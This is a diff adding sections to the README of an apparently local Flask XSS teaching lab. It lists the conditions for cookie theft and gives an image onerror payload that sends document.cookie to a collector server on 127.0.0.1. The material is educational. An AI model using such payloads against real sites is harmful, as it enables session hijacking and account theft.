@@ -22,6 +22,15 @@ As you started the flask app in development mode, any source changes should appl
 the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.
 
 
+# How it works
+## Conditions for this XSS payload to steal cookies from the user
+* The Content Security policy of the webpage must be misconfigured
+  * `httponly` ensures that the cookies are not know by the javascript engine
+  * `script-src` must be incorrectly set
+* Autoescape must be off
+  * There must be no autoescape at the side of the server.
+
+
 # Demostrations of XSS
 ## Things to note BEFORE trying the demostration
 * Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
@@ -67,6 +76,14 @@ You can make use of the XSSQueryFormer inside the folder to experiment around wi
 Usage:
 * `python XSSQueryFormer.py "{Javascript Code here}"` to convert your code to javascript
 * `python XSSQueryFormer.py -h` to show help message
+
+
+# Different ways of executing XSS
+
+## Execution of XSS through image loading
+* Go to the images tab of the website
+* Add ```' onerror=document.location='http://127.0.0.1:1000/?c='+document.cookie;class=``` after the `#` symbol
+* It will cause the xss script to execute and the cookie will be obtained by the malicious server
 
 # Protection mechanisms
 
